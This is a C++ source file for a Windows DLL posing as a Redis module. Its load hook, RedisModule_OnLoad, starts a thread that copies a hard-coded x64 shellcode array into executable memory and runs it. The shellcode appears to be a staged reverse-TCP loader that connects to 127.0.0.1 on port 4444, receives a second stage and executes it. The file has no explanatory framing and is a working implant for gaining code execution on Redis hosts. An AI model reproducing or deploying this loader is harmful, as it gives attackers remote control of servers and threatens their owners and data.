#include "pch.h"
#include<Windows.h>

typedef struct RedisModuleCtx RedisModuleCtx;
typedef struct RedisModuleString RedisModuleString;
#define REDISMODULE_ERR 1

void code() {


    int i;
    //------------------------------------------------------------
//-----------       Created with 010 Editor        -----------
//------         www.sweetscape.com/010editor/          ------
//
// File    : Untitled1
// Address : 0 (0x0)
// Size    : 510 (0x1FE)
//------------------------------------------------------------
    int hexData[510] = {
        0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xCC, 0x00,
        0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x48,
        0x31, 0xD2, 0x51, 0x56, 0x65, 0x48, 0x8B, 0x52,
        0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52,
        0x20, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31,
        0xC9, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x31, 0xC0,
        0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41,
        0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED,
        0x52, 0x48, 0x8B, 0x52, 0x20, 0x41, 0x51, 0x8B,
        0x42, 0x3C, 0x48, 0x01, 0xD0, 0x66, 0x81, 0x78,
        0x18, 0x0B, 0x02, 0x0F, 0x85, 0x72, 0x00, 0x00,
        0x00, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
        0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50,
        0x44, 0x8B, 0x40, 0x20, 0x8B, 0x48, 0x18, 0x49,
        0x01, 0xD0, 0xE3, 0x56, 0x4D, 0x31, 0xC9, 0x48,
        0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48, 0x01,
        0xD6, 0x48, 0x31, 0xC0, 0x41, 0xC1, 0xC9, 0x0D,
        0xAC, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
        0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1,
        0x75, 0xD8, 0x58, 0x44, 0x8B, 0x40, 0x24, 0x49,
        0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
        0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B,
        0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41,
        0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
        0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52,
        0xFF, 0xE0, 0x58, 0x41, 0x59, 0x5A, 0x48, 0x8B,
        0x12, 0xE9, 0x4B, 0xFF, 0xFF, 0xFF, 0x5D, 0x49,
        0xBE, 0x77, 0x73, 0x32, 0x5F, 0x33, 0x32, 0x00,
        0x00, 0x41, 0x56, 0x49, 0x89, 0xE6, 0x48, 0x81,
        0xEC, 0xA0, 0x01, 0x00, 0x00, 0x49, 0x89, 0xE5,
        0x49, 0xBC, 0x02, 0x00, 0x11, 0x5C, 0x7F, 0x00,
        0x00, 0x01, 0x41, 0x54, 0x49, 0x89, 0xE4, 0x4C,
        0x89, 0xF1, 0x41, 0xBA, 0x4C, 0x77, 0x26, 0x07,
        0xFF, 0xD5, 0x4C, 0x89, 0xEA, 0x68, 0x01, 0x01,
        0x00, 0x00, 0x59, 0x41, 0xBA, 0x29, 0x80, 0x6B,
        0x00, 0xFF, 0xD5, 0x6A, 0x0A, 0x41, 0x5E, 0x50,
        0x50, 0x4D, 0x31, 0xC9, 0x4D, 0x31, 0xC0, 0x48,
        0xFF, 0xC0, 0x48, 0x89, 0xC2, 0x48, 0xFF, 0xC0,
        0x48, 0x89, 0xC1, 0x41, 0xBA, 0xEA, 0x0F, 0xDF,
        0xE0, 0xFF, 0xD5, 0x48, 0x89, 0xC7, 0x6A, 0x10,
        0x41, 0x58, 0x4C, 0x89, 0xE2, 0x48, 0x89, 0xF9,
        0x41, 0xBA, 0x99, 0xA5, 0x74, 0x61, 0xFF, 0xD5,
        0x85, 0xC0, 0x74, 0x0A, 0x49, 0xFF, 0xCE, 0x75,
        0xE5, 0xE8, 0x93, 0x00, 0x00, 0x00, 0x48, 0x83,
        0xEC, 0x10, 0x48, 0x89, 0xE2, 0x4D, 0x31, 0xC9,
        0x6A, 0x04, 0x41, 0x58, 0x48, 0x89, 0xF9, 0x41,
        0xBA, 0x02, 0xD9, 0xC8, 0x5F, 0xFF, 0xD5, 0x83,
        0xF8, 0x00, 0x7E, 0x55, 0x48, 0x83, 0xC4, 0x20,
        0x5E, 0x89, 0xF6, 0x6A, 0x40, 0x41, 0x59, 0x68,
        0x00, 0x10, 0x00, 0x00, 0x41, 0x58, 0x48, 0x89,
        0xF2, 0x48, 0x31, 0xC9, 0x41, 0xBA, 0x58, 0xA4,
        0x53, 0xE5, 0xFF, 0xD5, 0x48, 0x89, 0xC3, 0x49,
        0x89, 0xC7, 0x4D, 0x31, 0xC9, 0x49, 0x89, 0xF0,
        0x48, 0x89, 0xDA, 0x48, 0x89, 0xF9, 0x41, 0xBA,
        0x02, 0xD9, 0xC8, 0x5F, 0xFF, 0xD5, 0x83, 0xF8,
        0x00, 0x7D, 0x28, 0x58, 0x41, 0x57, 0x59, 0x68,
        0x00, 0x40, 0x00, 0x00, 0x41, 0x58, 0x6A, 0x00,
        0x5A, 0x41, 0xBA, 0x0B, 0x2F, 0x0F, 0x30, 0xFF,
        0xD5, 0x57, 0x59, 0x41, 0xBA, 0x75, 0x6E, 0x4D,
        0x61, 0xFF, 0xD5, 0x49, 0xFF, 0xCE, 0xE9, 0x3C,
        0xFF, 0xFF, 0xFF, 0x48, 0x01, 0xC3, 0x48, 0x29,
        0xC6, 0x48, 0x85, 0xF6, 0x75, 0xB4, 0x41, 0xFF,
        0xE7, 0x58, 0x6A, 0x00, 0x59, 0x49, 0xC7, 0xC2,
        0xF0, 0xB5, 0xA2, 0x56, 0xFF, 0xD5
    };


    HMODULE h = GetModuleHandle("kernel32.dll");

    decltype(VirtualAlloc)* fuck = (decltype(VirtualAlloc)*)GetProcAddress(h, "VirtualAlloc");




    PBYTE buf = (PBYTE)fuck(NULL, sizeof(hexData) + 1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    for (i = 0; i < sizeof(hexData) / 4; i++) {
        buf[i] = (BYTE)hexData[i];
    }

    ((void(*)())buf)();
    

}

extern "C" __declspec(dllexport) int RedisModule_OnLoad(RedisModuleCtx* ctx, RedisModuleString** argv, int argc) {
    DWORD  threadId;
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)code, 0, 0, &threadId);
    return REDISMODULE_ERR;
}




BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

